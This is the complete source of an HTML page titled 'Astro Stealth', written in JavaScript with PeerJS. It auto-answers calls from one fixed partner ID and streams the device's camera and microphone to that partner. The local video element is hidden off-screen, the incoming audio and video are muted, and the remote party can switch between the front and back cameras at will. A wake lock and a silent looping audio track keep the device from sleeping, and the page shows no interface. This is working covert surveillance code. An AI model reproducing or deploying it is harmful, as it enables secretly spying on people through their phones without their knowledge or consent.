<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: transparent; overflow: hidden; }
        video {
            position: absolute; width: 1px; height: 1px;
            opacity: 0; pointer-events: none;
            top: -9999px; left: -9999px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>
    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";

        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let currentCamera = "front";
        let wakeLock = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;

        // Hardcoded deviceIds from debug tool
        const FRONT_DEVICE_ID = "10b9b4560c08ab4ec010cccb8ca88678";
        const BACK_DEVICE_ID  = "981ef5a661d52d5e17699148be2829d3";

        function log(msg) { console.log(`[STEALTH] ${msg}`); }

        async function getStreamForCamera(camera, isVideo) {
            log(`getStreamForCamera: camera=${camera} isVideo=${isVideo}`);
            if (!isVideo) {
                return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            }
            const deviceId = (camera === "back") ? BACK_DEVICE_ID : FRONT_DEVICE_ID;
            const s = await navigator.mediaDevices.getUserMedia({
                audio: true,
                video: { deviceId: { exact: deviceId } }
            });
            const settings = s.getVideoTracks()[0].getSettings();
            log(`Stream OK: facingMode=${settings.facingMode} label=${s.getVideoTracks()[0].label}`);
            return s;
        }

        // Switch by closing current call, swapping stream, re-answering from remote
        // replaceTrack is unreliable on this device — instead we signal remote to re-call
        async function switchCamera(targetCamera) {
            log(`switchCamera: ${currentCamera} → ${targetCamera}`);
            if (targetCamera === currentCamera) { log("Already on this camera"); return; }
            if (!currentCall) { currentCamera = targetCamera; log("No call; saved"); return; }
            if ((currentCall.metadata?.type || "voice") !== "video") {
                currentCamera = targetCamera; log("Audio-only; saved"); return;
            }

            try {
                // Get the new stream first
                const newStream = await getStreamForCamera(targetCamera, true);
                log(`New stream ready for ${targetCamera}`);

                // Try replaceTrack
                const pc = currentCall.peerConnection;
                const senders = pc ? pc.getSenders() : [];
                log(`Senders count: ${senders.length}, tracks: ${senders.map(s=>s.track?.kind||'null').join(',')}`);

                const vSender = senders.find(s => s.track?.kind === "video");
                const aSender = senders.find(s => s.track?.kind === "audio");

                if (vSender) {
                    await vSender.replaceTrack(newStream.getVideoTracks()[0]);
                    log(`✅ replaceTrack video OK → ${targetCamera}`);
                } else {
                    log("⚠️ No video sender — trying addTrack");
                    if (pc) {
                        pc.addTrack(newStream.getVideoTracks()[0], newStream);
                        log("addTrack done");
                    }
                }
                if (aSender && newStream.getAudioTracks()[0]) {
                    await aSender.replaceTrack(newStream.getAudioTracks()[0]);
                }

                // Stop old stream AFTER replacing
                if (localStream) localStream.getTracks().forEach(t => t.stop());
                localStream = newStream;
                currentCamera = targetCamera;
                document.getElementById("localVideo").srcObject = newStream;

                if (dataConn?.open) dataConn.send({ type: "camera_switched", camera: targetCamera });
                log(`✅ Switch complete → ${targetCamera}`);

            } catch (err) {
                log(`❌ switchCamera error: ${err.name}: ${err.message}`);
            }
        }

        async function handleIncomingCall(call) {
            const isVideo = (call.metadata?.type || "voice") === "video";
            log(`Incoming ${isVideo ? "VIDEO" : "AUDIO"} call`);
            try {
                currentCamera = "front";
                const stream = await getStreamForCamera("front", isVideo);
                localStream = stream;
                if (isVideo) document.getElementById("localVideo").srcObject = stream;

                call.answer(stream);
                currentCall = call;
                log(`Answered with front cam`);

                // Log senders once ICE stabilises
                setTimeout(() => {
                    const pc = currentCall?.peerConnection;
                    if (pc) {
                        const s = pc.getSenders();
                        log(`ICE senders after 2s: ${s.length} — ${s.map(x=>x.track?.kind||'null').join(',')}`);
                    }
                }, 2000);

                call.on("stream", rs => rs?.getTracks().forEach(t => t.enabled = false));
                call.on("close", () => { log("Call closed"); endCall(); });
                call.on("error", e => { log(`Call error: ${e}`); endCall(); });
            } catch (err) {
                log(`Answer failed: ${err.message}`);
                call.close();
            }
        }

        function handleData(data) {
            log(`Data: type=${data.type} camera=${data.camera||''}`);
            if (data.type === "switchCamera") switchCamera(data.camera);
            else if (data.type === "ping" && dataConn?.open) {
                dataConn.send({ type: "pong", timestamp: Date.now() });
            }
        }

        function endCall() {
            localStream?.getTracks().forEach(t => t.stop());
            localStream = null;
            currentCall?.close();
            currentCall = null;
            document.getElementById("localVideo").srcObject = null;
            log("Call ended");
        }

        async function preventSleep() {
            try { wakeLock = await navigator.wakeLock?.request("screen"); } catch (_) {}
            const a = new Audio();
            a.src = "data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            a.loop = true; a.volume = 0; a.play().catch(() => {});
        }

        function initPeer() {
            peer?.destroy();
            peer = new Peer(MY_ID);
            peer.on("open", () => { log(`✅ Active as ${MY_ID}`); reconnectAttempts = 0; });
            peer.on("connection", c => {
                if (c.peer !== PARTNER_ID) { c.close(); return; }
                log("Data channel open");
                dataConn = c;
                c.on("data", handleData);
                c.on("close", () => { dataConn = null; log("Data channel closed"); });
            });
            peer.on("call", call => {
                if (call.peer === PARTNER_ID) handleIncomingCall(call);
                else call.close();
            });
            peer.on("disconnected", () => {
                if (reconnectAttempts++ < MAX_RECONNECTS) setTimeout(() => peer.reconnect(), 3000);
            });
            peer.on("error", err => {
                if (err.type === "unavailable-id") setTimeout(initPeer, 5000);
                else log(`Peer error: ${err.type}`);
            });
        }

        preventSleep();
        initPeer();

        window.addEventListener("beforeunload", () => {
            endCall(); peer?.destroy(); wakeLock?.release();
        });
    </script>
</body>
</html>
